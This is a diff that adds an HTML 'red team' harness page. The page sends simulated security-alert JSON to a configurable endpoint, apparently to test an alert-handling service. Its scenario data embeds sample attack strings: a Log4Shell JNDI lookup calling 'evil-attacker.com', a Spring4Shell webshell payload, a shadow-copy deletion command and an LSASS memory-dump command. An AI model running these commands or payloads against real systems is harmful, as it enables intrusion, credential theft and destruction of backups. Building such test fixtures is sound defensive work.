@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full bg-slate-950">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Terminus Opposer | Red Team Attack Harness</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="h-full bg-slate-950 text-slate-100 font-sans antialiased flex flex-col">
+
+  <!-- Header -->
+  <header class="border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-16">
+        
+        <div class="flex items-center gap-4">
+          <div class="w-9 h-9 rounded-lg bg-gradient-to-br from-rose-600 to-red-800 flex items-center justify-center shadow-lg shadow-rose-950/50 ring-1 ring-rose-500/30">
+            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+            </svg>
+          </div>
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="font-bold text-lg tracking-tight text-white">Terminus</span>
+              <span class="px-2 py-0.5 text-xs font-semibold rounded-full bg-rose-500/10 text-rose-400 border border-rose-500/20 font-mono">OPPOSER ENGINE</span>
+            </div>
+            <p class="text-xs text-slate-400">Standalone Red Team Threat Testing Appliance</p>
+          </div>
+        </div>
+
+        <div class="flex items-center gap-3">
+          <div class="flex items-center gap-2 bg-slate-800/80 px-3 py-1.5 rounded-md border border-slate-700">
+            <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+            <span class="text-xs text-slate-300 font-mono">Opposer Service Active</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Grid -->
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+    <!-- Config & Presets (7 Cols) -->
+    <div class="lg:col-span-7 space-y-6">
+
+      <!-- Target Setup -->
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
+        <div class="flex items-center justify-between mb-4">
+          <h2 class="text-sm font-semibold text-white uppercase tracking-wider flex items-center gap-2">
+            <svg class="w-4 h-4 text-rose-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/>
+            </svg>
+            Target Connection Settings
+          </h2>
+          <span class="text-xs text-slate-500 font-mono">Enter Ngrok Tunnel or Target URL</span>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-12 gap-4">
+          <div class="md:col-span-8">
+            <label for="targetUrl" class="block text-xs font-medium text-slate-400 mb-1">Target Base / Ngrok URL (Honeypot or Webhook)</label>
+            <input type="url" id="targetUrl" value="http://localhost:5000" placeholder="https://abc1234.ngrok-free.app" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white font-mono focus:ring-2 focus:ring-rose-500 focus:border-rose-500 outline-none transition">
+          </div>
+
+          <div class="md:col-span-4">
+            <label for="targetPath" class="block text-xs font-medium text-slate-400 mb-1">Endpoint Path</label>
+            <input type="text" id="targetPath" value="/api/search" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white font-mono focus:ring-2 focus:ring-rose-500 focus:border-rose-500 outline-none transition">
+          </div>
+
+          <div class="md:col-span-6">
+            <label for="orgId" class="block text-xs font-medium text-slate-400 mb-1">X-Org-ID Header</label>
+            <input type="text" id="orgId" value="org-00000001" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white font-mono focus:ring-2 focus:ring-rose-500 focus:border-rose-500 outline-none transition">
+          </div>
+
+          <div class="md:col-span-6">
+            <label for="sessionToken" class="block text-xs font-medium text-slate-400 mb-1">Auth Token Header</label>
+            <input type="text" id="sessionToken" value="tok-demo-sim-agent" class="w-full bg-slate-950 border border-slate-700 rounded-lg px-3 py-2 text-sm text-white font-mono focus:ring-2 focus:ring-rose-500 focus:border-rose-500 outline-none transition">
+          </div>
+        </div>
+      </div>
+
+      <!-- Scenarios Grid -->
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
+        <div class="flex items-center justify-between mb-4">
+          <div>
+            <h2 class="text-sm font-semibold text-white uppercase tracking-wider flex items-center gap-2">
+              <svg class="w-4 h-4 text-rose-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
+              </svg>
+              CVE & Threat Scenarios
+            </h2>
+            <p class="text-xs text-slate-400 mt-0.5">Select a vulnerability vector to send against target honeypot</p>
+          </div>
+          <button id="btnRunCampaign" class="px-3 py-1.5 text-xs font-semibold bg-rose-600 hover:bg-rose-500 text-white rounded-lg transition shadow-md shadow-rose-950 flex items-center gap-1.5">
+            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"/>
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+            Execute All Scenarios
+          </button>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-3" id="scenarioGrid">
+          <div data-scenario="log4shell" class="scenario-card cursor-pointer border border-slate-800 hover:border-rose-500/50 bg-slate-950/60 hover:bg-slate-950 p-3.5 rounded-lg transition group">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="text-xs font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">CVE-2021-44228</span>
+                <h3 class="text-sm font-semibold text-white mt-1 group-hover:text-rose-400 transition">Log4Shell RCE</h3>
+              </div>
+              <span class="text-xs font-semibold px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-800">Critical (12)</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-2">JNDI injection attempt in User-Agent header via Apache Log4j2.</p>
+          </div>
+
+          <div data-scenario="spring4shell" class="scenario-card cursor-pointer border border-slate-800 hover:border-rose-500/50 bg-slate-950/60 hover:bg-slate-950 p-3.5 rounded-lg transition group">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="text-xs font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">CVE-2022-22965</span>
+                <h3 class="text-sm font-semibold text-white mt-1 group-hover:text-rose-400 transition">Spring4Shell WebShell</h3>
+              </div>
+              <span class="text-xs font-semibold px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-800">Critical (11)</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-2">Classloader manipulation writing webshell artifact to webapps/ROOT/shell.jsp.</p>
+          </div>
+
+          <div data-scenario="ransomware" class="scenario-card cursor-pointer border border-slate-800 hover:border-rose-500/50 bg-slate-950/60 hover:bg-slate-950 p-3.5 rounded-lg transition group">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="text-xs font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">MITRE T1490</span>
+                <h3 class="text-sm font-semibold text-white mt-1 group-hover:text-rose-400 transition">Ransomware Inhibited Recovery</h3>
+              </div>
+              <span class="text-xs font-semibold px-2 py-0.5 rounded bg-red-950 text-red-400 border border-red-800">High (10)</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-2">Deletion of Volume Shadow Copies (`vssadmin delete shadows`) & service stops.</p>
+          </div>
+
+          <div data-scenario="lsass" class="scenario-card cursor-pointer border border-slate-800 hover:border-rose-500/50 bg-slate-950/60 hover:bg-slate-950 p-3.5 rounded-lg transition group">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="text-xs font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">MITRE T1003.001</span>
+                <h3 class="text-sm font-semibold text-white mt-1 group-hover:text-rose-400 transition">LSASS Credential Dump</h3>
+              </div>
+              <span class="text-xs font-semibold px-2 py-0.5 rounded bg-amber-950 text-amber-400 border border-amber-800">High (9)</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-2">rundll32.exe executing comsvcs.dll MiniDump against lsass.exe process ID.</p>
+          </div>
+
+          <div data-scenario="ssh_brute" class="scenario-card cursor-pointer border border-slate-800 hover:border-rose-500/50 bg-slate-950/60 hover:bg-slate-950 p-3.5 rounded-lg transition group">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="text-xs font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">MITRE T1110</span>
+                <h3 class="text-sm font-semibold text-white mt-1 group-hover:text-rose-400 transition">SSH Password Spraying</h3>
+              </div>
+              <span class="text-xs font-semibold px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">Medium (6)</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-2">Repeated SSH login authentication failures across administrative user accounts.</p>
+          </div>
+
+          <div data-scenario="kerberoast" class="scenario-card cursor-pointer border border-slate-800 hover:border-rose-500/50 bg-slate-950/60 hover:bg-slate-950 p-3.5 rounded-lg transition group">
+            <div class="flex items-start justify-between">
+              <div>
+                <span class="text-xs font-mono px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/20">MITRE T1558.003</span>
+                <h3 class="text-sm font-semibold text-white mt-1 group-hover:text-rose-400 transition">Kerberoasting TGS Request</h3>
+              </div>
+              <span class="text-xs font-semibold px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">Medium (7)</span>
+            </div>
+            <p class="text-xs text-slate-400 mt-2">Requesting RC4-HMAC encrypted Kerberos ticket-granting service tickets for offline cracking.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- JSON Payload Editor -->
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl">
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="text-sm font-semibold text-white uppercase tracking-wider flex items-center gap-2">
+            <svg class="w-4 h-4 text-sky-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/>
+            </svg>
+            Payload JSON Configurator
+          </h2>
+          <span class="text-xs text-slate-400 font-mono" id="activeScenarioLabel">Selected: Log4Shell RCE</span>
+        </div>
+
+        <textarea id="payloadEditor" rows="11" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 font-mono text-xs text-emerald-400 focus:ring-2 focus:ring-rose-500 focus:border-rose-500 outline-none transition resize-y"></textarea>
+
+        <div class="flex items-center justify-between mt-4">
+          <button id="btnFormatJson" class="px-3 py-1.5 text-xs font-medium text-slate-400 hover:text-white bg-slate-800 hover:bg-slate-700 rounded-md border border-slate-700 transition">
+            Format JSON
+          </button>
+          <button id="btnFirePayload" class="px-5 py-2 text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white rounded-lg transition shadow-lg shadow-rose-950 flex items-center gap-2">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+            </svg>
+            SEND THREAT VECTOR TO TARGET
+          </button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Live Execution Console (5 Cols) -->
+    <div class="lg:col-span-5 flex flex-col space-y-6">
+      <div class="bg-slate-900 border border-slate-800 rounded-xl p-5 shadow-xl flex-1 flex flex-col min-h-[550px]">
+        <div class="flex items-center justify-between mb-3 border-b border-slate-800 pb-3">
+          <div class="flex items-center gap-2">
+            <span class="w-3 h-3 rounded-full bg-red-500/80 inline-block"></span>
+            <span class="w-3 h-3 rounded-full bg-amber-500/80 inline-block"></span>
+            <span class="w-3 h-3 rounded-full bg-emerald-500/80 inline-block"></span>
+            <span class="text-xs font-mono font-semibold text-slate-300 ml-2">Opposer Execution Terminal</span>
+          </div>
+          <button id="btnClearLogs" class="text-xs text-slate-500 hover:text-slate-300 font-mono transition">Clear</button>
+        </div>
+
+        <div id="terminalLog" class="flex-1 bg-slate-950 border border-slate-800 rounded-lg p-4 font-mono text-xs overflow-y-auto space-y-4 max-h-[650px] leading-relaxed">
+          <div class="text-slate-500 italic">
+            [SYS] Opposer Standalone Appliance Online.<br>
+            [SYS] Target ready. Select scenario and click "SEND THREAT VECTOR TO TARGET".
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    const scenarios = {
+      log4shell: {
+        id: "alt-log4j-cve-2021-44228",
+        rule: {
+          id: 100201,
+          level: 12,
+          description: "CVE-2021-44228 Log4Shell Remote Code Execution Payload via User-Agent",
+          mitre: { id: "T1190" }
+        },
+        agent: {
+          id: "agent-honeypot-01",
+          name: "prod-web-front-01"
+        },
+        full_log: "2026-09-03T22:14:00Z web-front-01 nginx: 192.168.1.100 - - [03/Sep/2026:22:14:00 +0000] \"GET /api/v1/search HTTP/1.1\" 200 4522 \"-\" \"\${jndi:ldap://evil-attacker.com:1389/a}\"",
+        timestamp: new Date().toISOString()
+      },
+      spring4shell: {
+        id: "alt-spring4shell-cve-2022-22965",
+        rule: {
+          id: 100205,
+          level: 11,
+          description: "CVE-2022-22965 Spring4Shell Data Binder RCE WebShell Creation",
+          mitre: { id: "T1505.003" }
+        },
+        agent: {
+          id: "agent-honeypot-02",
+          name: "spring-app-server"
+        },
+        full_log: "POST /app/login HTTP/1.1 - Payload: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))",
+        timestamp: new Date().toISOString()
+      },
+      ransomware: {
+        id: "alt-ransomware-t1490",
+        rule: {
+          id: 100310,
+          level: 10,
+          description: "MITRE T1490 Inhibited Recovery - Volume Shadow Copy Deletion",
+          mitre: { id: "T1490" }
+        },
+        agent: {
+          id: "agent-win-db01",
+          name: "corporate-db-01"
+        },
+        full_log: "Process Create: C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet",
+        timestamp: new Date().toISOString()
+      },
+      lsass: {
+        id: "alt-lsass-dump-t1003",
+        rule: {
+          id: 100405,
+          level: 9,
+          description: "MITRE T1003.001 Credential Dumping via LSASS Process Memory",
+          mitre: { id: "T1003.001" }
+        },
+        agent: {
+          id: "agent-win-dc01",
+          name: "dc-primary.corp"
+        },
+        full_log: "Process Create: C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 648 C:\\ProgramData\\lsass.dmp full",
+        timestamp: new Date().toISOString()
+      },
+      ssh_brute: {
+        id: "alt-ssh-brute-t1110",
+        rule: {
+          id: 100102,
+          level: 6,
+          description: "MITRE T1110 SSH Password Spraying & Brute Force Attack",
+          mitre: { id: "T1110" }
+        },
+        agent: {
+          id: "agent-linux-bastion",
+          name: "bastion-ssh-gateway"
+        },
+        full_log: "Failed password for invalid user admin from 198.51.100.42 port 44321 ssh2 (Attempt 48/50)",
+        timestamp: new Date().toISOString()
+      },
+      kerberoast: {
+        id: "alt-kerberoast-t1558",
+        rule: {
+          id: 100550,
+          level: 7,
+          description: "MITRE T1558.003 Kerberoasting Service Ticket Request",
+          mitre: { id: "T1558.003" }
+        },
+        agent: {
+          id: "agent-win-dc01",
+          name: "dc-primary.corp"
+        },
+        full_log: "Event 4769: A Kerberos service ticket was requested. Service Name: MSSQLSvc/db01.corp Ticket Encryption Type: 0x17 (RC4-HMAC)",
+        timestamp: new Date().toISOString()
+      }
+    };
+
+    let activeScenarioKey = 'log4shell';
+
+    const payloadEditor = document.getElementById('payloadEditor');
+    const activeScenarioLabel = document.getElementById('activeScenarioLabel');
+    const terminalLog = document.getElementById('terminalLog');
+    const targetUrlInput = document.getElementById('targetUrl');
+    const targetPathInput = document.getElementById('targetPath');
+    const orgIdInput = document.getElementById('orgId');
+    const sessionTokenInput = document.getElementById('sessionToken');
+
+    function loadScenario(key) {
+      activeScenarioKey = key;
+      const data = scenarios[key];
+      data.timestamp = new Date().toISOString();
+      payloadEditor.value = JSON.stringify(data, null, 2);
+      const ruleDesc = data.rule ? data.rule.description : (data.rule_description || 'Threat Payload');
+      activeScenarioLabel.textContent = `Selected: ${ruleDesc.split(' - ')[0]}`;
+
+      document.querySelectorAll('.scenario-card').forEach(card => {
+        if (card.dataset.scenario === key) {
+          card.classList.add('border-rose-500', 'bg-slate-900', 'ring-1', 'ring-rose-500/50');
+          card.classList.remove('border-slate-800', 'bg-slate-950/60');
+        } else {
+          card.classList.remove('border-rose-500', 'bg-slate-900', 'ring-1', 'ring-rose-500/50');
+          card.classList.add('border-slate-800', 'bg-slate-950/60');
+        }
+      });
+    }
+
+    loadScenario('log4shell');
+
+    document.querySelectorAll('.scenario-card').forEach(card => {
+      card.addEventListener('click', () => {
+        loadScenario(card.dataset.scenario);
+      });
+    });
+
+    document.getElementById('btnFormatJson').addEventListener('click', () => {
+      try {
+        const parsed = JSON.parse(payloadEditor.value);
+        payloadEditor.value = JSON.stringify(parsed, null, 2);
+      } catch (err) {
+        logToTerminal(`[ERR] JSON Format Error: ${err.message}`, 'error');
+      }
+    });
+
+    function logToTerminal(text, type = 'info') {
+      const entry = document.createElement('div');
+      const time = new Date().toLocaleTimeString();
+      
+      let badgeClass = 'text-sky-400';
+      if (type === 'success') badgeClass = 'text-emerald-400';
+      if (type === 'error') badgeClass = 'text-rose-400';
+      if (type === 'warn') badgeClass = 'text-amber-400';
+
+      entry.innerHTML = `<span class="text-slate-600">[${time}]</span> <span class="${badgeClass} font-semibold">${text}</span>`;
+      terminalLog.appendChild(entry);
+      terminalLog.scrollTop = terminalLog.scrollHeight;
+    }
+
+    document.getElementById('btnClearLogs').addEventListener('click', () => {
+      terminalLog.innerHTML = `<div class="text-slate-500 italic">[SYS] Console cleared.</div>`;
+    });
+
+    async function firePayload(customData = null) {
+      const baseUrl = targetUrlInput.value.trim().replace(/\/$/, '');
+      const path = targetPathInput.value.trim();
+      const fullEndpoint = `${baseUrl}${path}`;
+      const orgId = orgIdInput.value.trim();
+      const token = sessionTokenInput.value.trim();
+
+      let payload;
+      try {
+        payload = customData || JSON.parse(payloadEditor.value);
+        payload.timestamp = new Date().toISOString();
+      } catch (err) {
+        logToTerminal(`[ERR] Invalid Payload JSON: ${err.message}`, 'error');
+        return;
+      }
+
+      const alertId = payload.id || payload.alert_id || 'alt-demo';
+      const ruleId = payload.rule ? payload.rule.id : (payload.rule_id || 'rule-100');
+      logToTerminal(`[POST] Target Endpoint: ${fullEndpoint}`, 'warn');
+      logToTerminal(`[PAYLOAD] Alert ID: ${alertId} | Vector: Rule ${ruleId}`, 'info');
+
+      const startTime = performance.now();
+
+      try {
+        const response = await fetch(fullEndpoint, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Org-ID': orgId,
+            'Authorization': `Bearer ${token}`
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const latency = Math.round(performance.now() - startTime);
+
+        if (response.ok) {
+          const resJson = await response.json();
+          logToTerminal(`[200 OK] Response received in ${latency}ms`, 'success');
+          logToTerminal(`<pre class="mt-1 p-2 bg-slate-900 rounded border border-slate-800 text-slate-300 font-mono text-[11px] overflow-x-auto">${JSON.stringify(resJson, null, 2)}</pre>`, 'success');
+        } else {
+          const errText = await response.text();
+          logToTerminal(`[${response.status} ${response.statusText}] Failed in ${latency}ms`, 'error');
+          logToTerminal(`[RESPONSE BODY] ${errText}`, 'error');
+        }
+      } catch (err) {
+        logToTerminal(`[NETWORK ERROR] ${err.message}`, 'error');
+      }
+    }
+
+    document.getElementById('btnFirePayload').addEventListener('click', () => firePayload());
+
+    document.getElementById('btnRunCampaign').addEventListener('click', async () => {
+      logToTerminal(`[CAMPAIGN] Executing automated attack scenario series against target...`, 'warn');
+      const scenarioKeys = Object.keys(scenarios);
+      
+      for (const key of scenarioKeys) {
+        loadScenario(key);
+        await firePayload(scenarios[key]);
+        await new Promise(r => setTimeout(r, 600));
+      }
+      logToTerminal(`[CAMPAIGN COMPLETE] All ${scenarioKeys.length} attack vectors dispatched.`, 'success');
+    });
+  </script>
+</body>
+</html>
